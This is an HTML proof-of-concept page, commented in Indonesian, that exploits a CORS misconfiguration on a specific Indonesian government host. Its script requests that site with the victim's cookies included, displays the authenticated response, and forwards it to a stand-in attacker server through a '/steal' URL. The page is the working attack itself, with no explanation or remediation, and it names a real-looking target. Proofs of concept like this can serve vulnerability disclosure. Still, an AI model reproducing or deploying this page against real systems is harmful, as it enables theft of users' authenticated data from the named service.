<!DOCTYPE html>
<html>
<head>
  <title>CORS PoC</title>
</head>
<body>
  <h1>CORS Misconfiguration PoC</h1>
  <pre id="output">Menunggu response...</pre>

  <script>
    fetch("https://beta-sipgn-fleet.bgn.go.id/", {
      method: "GET",
      credentials: "include", // kirim cookie korban
      headers: {
        "Content-Type": "application/json"
      }
    })
    .then(response => response.text())
    .then(data => {
      document.getElementById("output").textContent = data;
      
      // Simulasi exfiltrate data ke server attacker
      fetch("https://attacker-server.com/steal?data=" + encodeURIComponent(data));
    })
    .catch(err => {
      document.getElementById("output").textContent = "Error: " + err;
    });
  </script>
</body>
</html>
